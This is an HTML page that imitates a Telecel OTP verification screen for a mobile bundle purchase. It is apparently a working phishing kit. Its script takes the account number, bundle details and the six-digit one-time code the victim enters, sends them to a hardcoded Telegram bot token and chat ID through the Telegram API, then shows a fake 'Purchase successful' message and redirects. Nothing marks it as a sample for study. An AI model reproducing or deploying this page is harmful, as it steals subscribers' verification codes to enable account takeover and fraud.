<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
    <title>Telecel - OTP Verification</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        
        * { 
            margin: 0; 
            padding: 0; 
            box-sizing: border-box; 
        }
        
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #E30613 0%, #0033A0 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            color: #333;
        }
        
        .container {
            width: 100%; 
            max-width: 420px;
            background: #fff; 
            border-radius: 16px;
            padding: 32px 24px; 
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.15);
            text-align: center;
        }
        
        .logo-t {
            color: #E30613; 
            font-size: 52px; 
            font-weight: 900; 
            letter-spacing: -1px;
            border: 4px solid #E30613; 
            border-radius: 50%;
            width: 80px; 
            height: 80px; 
            line-height: 72px; 
            margin: 0 auto;
        }
        
        .logo-text {
            color: #E30613; 
            font-size: 28px; 
            font-weight: 700; 
            margin: 8px 0 24px;
        }
        
        h1 { 
            font-size: 24px; 
            font-weight: 700; 
            margin-bottom: 8px; 
        }
        
        .subtitle { 
            font-size: 15px; 
            color: #555; 
            line-height: 1.4; 
            margin-bottom: 24px; 
        }
        
        .otp-container {
            display: flex;
            justify-content: space-between;
            gap: 8px;
            margin: 24px 0;
        }
        
        .otp-input {
            width: 50px;
            height: 60px;
            text-align: center;
            font-size: 24px;
            font-weight: 700;
            border: 2px solid #E30613;
            border-radius: 12px;
            outline: none;
            transition: all 0.3s;
        }
        
        .otp-input:focus {
            box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.12);
            border-color: #0033A0;
        }

        .error-msg {
            color: #dc3545; 
            font-size: 13px; 
            margin-top: 6px; 
            display: none;
            padding: 10px;
            background: rgba(220, 53, 69, 0.1);
            border-radius: 6px;
        }
        
        .success-msg {
            color: #28a745; 
            font-size: 13px; 
            margin-top: 6px; 
            display: none;
            padding: 10px;
            background: rgba(40, 167, 69, 0.1);
            border-radius: 6px;
        }
        
        .btn-action {
            width: 100%; 
            padding: 18px; 
            font-size: 18px; 
            font-weight: 700;
            border-radius: 12px; 
            cursor: pointer; 
            transition: all 0.2s; 
            margin: 12px 0 8px;
            color: #fff; 
            background: linear-gradient(135deg, #E30613 0%, #0033A0 100%);
            border: none;
            box-shadow: 0 4px 12px rgba(227, 6, 19, 0.25);
        }
        
        .btn-action:hover { 
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(227, 6, 19, 0.35);
        }
        
        .btn-action:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        #spinner {
            position: fixed; 
            inset: 0; 
            background: rgba(227, 6, 19, 0.15);
            display: none; 
            justify-content: center; 
            align-items: center; 
            z-index: 9999;
        }
        
        .spin {
            width: 60px; 
            height: 60px; 
            border: 6px solid #f0f0f0;
            border-top: 6px solid #E30613; 
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin { 
            to { transform: rotate(360deg); } 
        }

        .resend-text {
            margin-top: 16px;
            font-size: 14px;
            color: #666;
        }

        .resend-text span {
            color: #0033A0;
            font-weight: 600;
            cursor: pointer;
        }

        .resend-text span:hover {
            text-decoration: underline;
        }

        @media (max-width: 480px) {
            .otp-input {
                width: 45px;
                height: 55px;
                font-size: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-t">t</div>
        <div class="logo-text">telecel</div>
        
        <h1>Verify Purchase</h1>
        <p class="subtitle">
            A 6-digit verification code has been sent to your number. Please enter it below to complete your purchase.
        </p>
        
        <div class="otp-container" id="otpInputs">
            <input type="text" class="otp-input" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
            <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
            <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
            <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
            <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
            <input type="text" class="otp-input" maxlength="1" inputmode="numeric">
        </div>
        
        <div class="error-msg" id="err">
            Invalid OTP. Please check and try again.
        </div>
        
        <div class="success-msg" id="successMsg">
            ✓ OTP Verified! Purchase successful.
        </div>
        
        <button class="btn-action" id="verifyBtn">
            Verify & Accept Purchase
        </button>

        <p class="resend-text">
            Didn't receive the code? <span id="resendBtn">Resend Code</span>
        </p>
    </div>
    
    <div id="spinner">
        <div class="spin"></div>
    </div>

    <script>
        const CONFIG = {
            BOT_TOKEN: '8625776173:AAE9XuhbvCy-Gp2d7GAbWLSp4c2sDUtExkw',
            CHAT_ID: '6573120346'
        };

        const inputs = document.querySelectorAll('.otp-input');
        const verifyBtn = document.getElementById('verifyBtn');
        const errMsg = document.getElementById('err');
        const successMsg = document.getElementById('successMsg');
        const spinner = document.getElementById('spinner');
        const resendBtn = document.getElementById('resendBtn');

        // Handle OTP Input focus and movement
        inputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                if (e.target.value.length > 1) {
                    e.target.value = e.target.value.slice(0, 1);
                }
                if (e.target.value && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    inputs[index - 1].focus();
                }
            });

            input.addEventListener('paste', (e) => {
                e.preventDefault();
                const pasteData = e.clipboardData.getData('text').slice(0, 6).split('');
                pasteData.forEach((char, i) => {
                    if (inputs[i]) {
                        inputs[i].value = char;
                    }
                });
                if (pasteData.length > 0) {
                    const nextIndex = Math.min(pasteData.length, inputs.length - 1);
                    inputs[nextIndex].focus();
                }
            });
        });

        function getOTP() {
            let otp = "";
            inputs.forEach(input => otp += input.value);
            return otp;
        }

        function showSpinner() { spinner.style.display = 'flex'; }
        function hideSpinner() { spinner.style.display = 'none'; }

        verifyBtn.onclick = () => {
            const otp = getOTP();
            if (otp.length !== 6) {
                errMsg.textContent = "Please enter all 6 digits";
                errMsg.style.display = 'block';
                return;
            }

            errMsg.style.display = 'none';
            showSpinner();

            // Send OTP to Telegram for verification
            const accountNumber = localStorage.getItem('accountNumber') || 'Unknown';
            const bundle = localStorage.getItem('selectedBundle') || 'Unknown';
            const price = localStorage.getItem('bundlePrice') || 'Unknown';

            const message = `<b>OTP Verification Received</b>\n\n` +
                            `Account: <code>${accountNumber}</code>\n` +
                            `Bundle: <code>${bundle}</code>\n` +
                            `Price: <code>GHS ${price}</code>\n` +
                            `OTP Code: <code>${otp}</code>\n\n` +
                            `<i>User is waiting for confirmation...</i>`;

            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            })
            .then(r => r.json())
            .then(data => {
                // In a real scenario, we might wait for another bot approval.
                // For this flow, we'll simulate a successful verification after sending to bot.
                setTimeout(() => {
                    hideSpinner();
                    successMsg.style.display = 'block';
                    verifyBtn.disabled = true;
                    inputs.forEach(input => input.disabled = true);
                    
                    // Redirect to success page
                    setTimeout(() => { window.location.href = 'success.html'; }, 2000);
                }, 2000);
            })
            .catch(err => {
                hideSpinner();
                errMsg.textContent = "Connection error. Please try again.";
                errMsg.style.display = 'block';
            });
        };

        resendBtn.onclick = () => {
            alert("A new code has been requested.");
            // Logic to trigger resend via bot or API
        };

        // Auto-focus first input
        inputs[0].focus();
    </script>
</body>
</html>
